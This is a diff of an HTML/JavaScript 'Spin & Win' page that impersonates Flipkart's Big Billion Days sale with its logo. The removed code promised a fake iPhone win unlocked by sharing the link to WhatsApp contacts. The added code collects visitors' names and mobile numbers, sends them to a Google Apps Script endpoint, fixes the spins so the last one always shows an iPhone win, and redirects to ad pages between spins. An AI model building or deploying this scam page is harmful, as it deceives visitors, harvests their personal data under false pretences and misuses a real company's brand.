@@ -32,20 +32,14 @@
       color: #ffeb3b;
     }
 
-    p {
-      margin: 15px;
-      font-size: 1.2em;
-      color: #333;
-    }
-
-    /* Wheel Container */
     .wheel-container {
       position: relative;
       margin: 20px auto;
-      width: 300px;
-      height: 300px;
+      width: 320px;
+      height: 320px;
     }
 
+    /* Wheel */
     .wheel {
       width: 100%;
       height: 100%;
@@ -60,24 +54,33 @@
         #ff9800 300deg 360deg
       );
       transition: transform 4s ease-out;
-      box-shadow: 0 6px 12px rgba(0,0,0,0.3);
       position: relative;
     }
 
-    /* Prize images */
-    .prize {
+    /* Pointer */
+    .pointer {
+      width: 0; 
+      height: 0; 
+      border-left: 20px solid transparent;
+      border-right: 20px solid transparent;
+      border-bottom: 30px solid red;
       position: absolute;
-      width: 60px;
-      height: 60px;
+      top: -35px;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+
+    /* Labels inside wheel */
+    .label {
+      position: absolute;
+      width: 80px;
+      text-align: center;
+      font-size: 1em;
+      font-weight: bold;
       top: 50%;
       left: 50%;
-      margin: -30px;
-      transform-origin: 50% 120px;
-    }
-    .prize img {
-      width: 100%;
-      height: 100%;
-      object-fit: contain;
+      transform-origin: 0 -120px;
+      color: white;
     }
 
     .spin-btn {
@@ -92,31 +95,6 @@
       margin-top: 20px;
     }
 
-    .hidden { display: none; }
-
-    .share-btn {
-      background: #25D366;
-      color: white;
-      padding: 12px 20px;
-      border-radius: 8px;
-      font-size: 1.2em;
-      text-decoration: none;
-      display: inline-block;
-      margin-top: 20px;
-    }
-
-    .claim-btn {
-      background: #2874f0;
-      color: white;
-      padding: 14px 28px;
-      border-radius: 10px;
-      font-size: 1.4em;
-      border: none;
-      cursor: pointer;
-      margin-top: 30px;
-      display: none;
-    }
-
     .ads {
       margin: 20px auto;
       width: 320px;
@@ -129,128 +107,142 @@
       background: #fff;
     }
 
+    .hidden { display: none; }
+
     #result {
       font-size: 1.6em;
       color: #d32f2f;
       font-weight: bold;
       margin-top: 20px;
     }
+
+    /* Form */
+    #userForm {
+      margin: 20px auto;
+      display: block;
+    }
+    input {
+      padding: 10px;
+      margin: 8px;
+      width: 80%;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    #submitBtn {
+      background: green;
+      color: white;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1em;
+    }
   </style>
 </head>
 <body>
 
-  <!-- Header with Flipkart logo -->
   <header>
     <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Flipkart_logo.svg" alt="Flipkart Logo">
     <span>Big Billion Days – Spin & Win 🎡</span>
   </header>
 
-  <p>Spin the wheel and stand a chance to win an <b>iPhone 🎁</b></p>
+  <p>Enter your details to get <b>3 Spins</b> and win exciting prizes 🎁</p>
+
+  <!-- User Form -->
+  <form id="userForm">
+    <input type="text" id="name" placeholder="Enter your name" required><br>
+    <input type="tel" id="mobile" placeholder="Enter your mobile number" required><br>
+    <button type="submit" id="submitBtn">Start Spinning</button>
+  </form>
 
   <!-- Wheel -->
-  <div class="wheel-container">
+  <div class="wheel-container hidden" id="gameArea">
+    <div class="pointer"></div>
     <div id="wheel" class="wheel">
-      <!-- Prize icons -->
-      <div class="prize" style="transform: rotate(30deg) translateY(-120px);">
-        <img src="https://cdn-icons-png.flaticon.com/512/8146/8146003.png" alt="iPhone">
-      </div>
-      <div class="prize" style="transform: rotate(90deg) translateY(-120px);">
-        <img src="https://cdn-icons-png.flaticon.com/512/1047/1047711.png" alt="AirPods">
-      </div>
-      <div class="prize" style="transform: rotate(150deg) translateY(-120px);">
-        <img src="https://cdn-icons-png.flaticon.com/512/1063/1063195.png" alt="Smartwatch">
-      </div>
-      <div class="prize" style="transform: rotate(210deg) translateY(-120px);">
-        <img src="https://cdn-icons-png.flaticon.com/512/3022/3022057.png" alt="Gift Box">
-      </div>
-      <div class="prize" style="transform: rotate(270deg) translateY(-120px);">
-        <img src="https://cdn-icons-png.flaticon.com/512/2907/2907253.png" alt="Earphones">
-      </div>
-      <div class="prize" style="transform: rotate(330deg) translateY(-120px);">
-        <img src="https://cdn-icons-png.flaticon.com/512/3450/3450133.png" alt="Speaker">
-      </div>
+      <div class="label" style="transform: rotate(30deg) translateY(-120px);">iPhone</div>
+      <div class="label" style="transform: rotate(90deg) translateY(-120px);">iPad</div>
+      <div class="label" style="transform: rotate(150deg) translateY(-120px);">EarPods</div>
+      <div class="label" style="transform: rotate(210deg) translateY(-120px);">Smartwatch</div>
+      <div class="label" style="transform: rotate(270deg) translateY(-120px);">Nothing</div>
+      <div class="label" style="transform: rotate(330deg) translateY(-120px);">Speaker</div>
     </div>
   </div>
 
-  <button id="spinBtn" class="spin-btn">🎡 Spin Now</button>
+  <button id="spinBtn" class="spin-btn hidden">🎡 Spin Now</button>
 
-  <!-- Result -->
-  <h2 id="result" class="hidden">🎉 Congratulations! You won an iPhone 🎁</h2>
-
-  <!-- Share instruction -->
-  <div id="shareSection" class="hidden">
-    <p>📲 Share this with 3 friends on WhatsApp to unlock your reward!</p>
-    <a id="shareBtn" class="share-btn"
-       href="whatsapp://send?text=🎉 I just won an iPhone! Spin now 👉 https://yourwebsite.github.io/spin-win/"
-       data-action="share/whatsapp/share">
-       🔗 Share on WhatsApp
-    </a>
-    <br>
-    <button id="verifyBtn" class="spin-btn">✅ I Shared</button>
-  </div>
-
-  <!-- Claim Button -->
- 
+  <div id="result"></div>
 
   <!-- Ad Slots -->
   <div class="ads">[Ad Slot 1]</div>
   <div class="ads">[Ad Slot 2]</div>
   <div class="ads">[Ad Slot 3]</div>
 
-  <canvas id="confetti" class="hidden"></canvas>
-
-   <button id="claimBtn" class="claim-btn">🎁 Claim Now</button>
-  
-  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
   <script>
+    const form = document.getElementById("userForm");
+    const gameArea = document.getElementById("gameArea");
     const wheel = document.getElementById("wheel");
     const spinBtn = document.getElementById("spinBtn");
     const result = document.getElementById("result");
-    const shareSection = document.getElementById("shareSection");
-    const claimBtn = document.getElementById("claimBtn");
-    const verifyBtn = document.getElementById("verifyBtn");
+
+    let spins = 0;
+    let hasWon = false;
+
+    // Handle form submit → Save to Google Sheets & show game
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+      const name = document.getElementById("name").value;
+      const mobile = document.getElementById("mobile").value;
+
+      // Send to Google Sheets
+      fetch("YOUR_GOOGLE_APPS_SCRIPT_URL", {
+        method: "POST",
+        body: JSON.stringify({ name, mobile }),
+        headers: { "Content-Type": "application/json" }
+      });
+
+      form.style.display = "none";
+      gameArea.classList.remove("hidden");
+      spinBtn.classList.remove("hidden");
+    });
 
     spinBtn.addEventListener("click", () => {
-      const randomDegree = 1800 + Math.floor(Math.random() * 360);
-      wheel.style.transform = `rotate(${randomDegree}deg)`;
-      setTimeout(() => {
-        result.classList.remove("hidden");
-        shareSection.classList.remove("hidden");
-        spinBtn.style.display = "none";
-        launchConfetti();
-      }, 4000);
-    });
+      spins++;
+      let degree;
 
-    verifyBtn.addEventListener("click", () => {
-      alert("✅ Share verified!");
-      shareSection.style.display = "none";
-      claimBtn.style.display = "inline-block";
-    });
-
-    claimBtn.addEventListener("click", () => {
-      alert("🎁 Your reward is being processed!");
-    });
-
-    // Confetti animation
-    function launchConfetti() {
-      const duration = 2 * 1000;
-      const animationEnd = Date.now() + duration;
-      const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 9999 };
-
-      function randomInRange(min, max) {
-        return Math.random() * (max - min) + min;
+      if (spins === 1) {
+        // Always lose first spin
+        degree = 1800 + 270; // lands on "Nothing"
+      } else if (spins < 3) {
+        // Random spin
+        degree = 1800 + Math.floor(Math.random() * 360);
+      } else {
+        // Force win on last spin
+        degree = 1800 + 30; // lands on iPhone
+        hasWon = true;
       }
 
-      (function frame() {
-        const timeLeft = animationEnd - Date.now();
-        if (timeLeft <= 0) return;
-        const particleCount = 50 * (timeLeft / duration);
-        confetti(Object.assign({}, defaults, { particleCount, origin: { x: randomInRange(0, 1), y: Math.random() - 0.2 } }));
-        requestAnimationFrame(frame);
-      })();
-    }
-  </script>
+      wheel.style.transform = `rotate(${degree}deg)`;
 
+      setTimeout(() => {
+        if (spins === 1) {
+          result.textContent = "❌ Oops, try again after the ad!";
+        } else if (spins === 2) {
+          result.textContent = "Almost there! Watch another ad...";
+        } else if (spins === 3) {
+          result.textContent = hasWon
+            ? "🎉 Congratulations! You won 🎁 We will reach back to you soon."
+            : "❌ Better luck next time!";
+          spinBtn.style.display = "none";
+        }
+
+        // Redirect to ad page after each spin (except last result message)
+        if (spins < 3) {
+          setTimeout(() => {
+            window.location.href = "https://example.com/ad-page"; // replace with ad page
+          }, 2000);
+        }
+      }, 4000);
+    });
+  </script>
 </body>
 </html>
-
